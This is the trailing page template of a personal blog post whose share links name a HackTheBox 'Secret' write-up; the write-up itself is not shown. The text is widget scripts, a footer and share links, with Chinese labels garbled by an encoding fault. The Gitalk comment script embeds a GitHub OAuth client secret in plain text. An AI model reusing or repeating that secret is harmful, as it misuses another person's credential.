    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=ã€ŠSecret - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=ã€ŠSecret - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠSecret - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACx0lEQVR42u3aMW7kMBAEQP//03vARQYMabtnRHuDUrSwKYnFgKSa8/UVX6//1/ff3//ys2XSJmmfPO2BCw8PD2/U9avrZ4fyJ1y1yd9+1YekPR4eHt5pXjJ95x26v/d+gJKlKOkzHh4e3ifw2sk92aDfA2bDhIeHh/c5vHbB2IQd+W88PDy8v+Il2+I2zG1ji2TjfjBrwcPDw4t5pyfuE7+Pn+/h4eHhjU7V26m5LSNIwtnX4sLDw8M7wUs2x20Z1lUX2213G/hGywMeHh7eQ7z7LuadnsUZbYTRlh3g4eHhnea1JVBtwDpDJkP8ZnnDw8PDO8BrYbPANz/6yt9efAzg4eHhPcSbxantYVVbdtAOdFQZgYeHh/cQL5/E861tsmzM2gz7gIeHh/cQbz9Zt2UEeVlAHhDXZ3R4eHh4C97sIL8uewoGq11+agseHh7eQ7xNtDo7xDoRPVy2xMPDwzvG2y8D7SFW8q68V5d/x8PDwzvAyw+TZhFAG/jO/vtmK4+Hh4f3KO+pAGIzfSdb7RaJh4eH91e8/cKQH2IlxQd5m8svBjw8PLw1L39xHuO2g9J2Oo8q8PDw8M7x8mOtfGu7iRtmFRBv7sXDw8M7wGu3v08tHpsyrLZMAQ8PD2/PS27eHHHNJvRkwYjweHh4eAd4+cvyYPdEyzySeHMMhoeHh/cQL59qN53O84H9QlJ/JeDh4eGVz0/i2lmbPNRoy7CKDwA8PDy8Y7z2mH8W6RYhQr6m3bfHw8PDe5T3Kq+2E5sYIo8bLu/Fw8PDO8CbTbj5pva+Q5vQYV+whYeHh7fhJYtBvjDM7mq378Vw4+Hh4R3jbTrdbspnpVrDMBoPDw/vY3izaCDfKM8Owy631Hh4eHh/xJuViibPz3nJARseHh7e7/D2033SrTZcWGXPeHh4eMd4m0/9dipPOt2yHxgIPDw8vJT3D75H2k83ez7TAAAAAElFTkSuQmCC" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
